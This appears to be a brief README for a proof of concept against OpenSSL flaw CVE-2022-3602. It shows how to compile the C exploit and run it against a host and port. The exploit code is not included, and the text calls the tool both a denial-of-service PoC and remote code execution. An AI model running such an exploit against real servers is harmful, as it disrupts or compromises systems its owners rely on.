# CVE-2022-3602 DOS poc
#### RCE in OpenSSL 3.0 < 3.0.7

Useage:
```
$ gcc -o CVE-2022-3602 CVE-2022-3602.c -lpthread
$ ./CVE-2022-3602 127.0.0.1 443
```
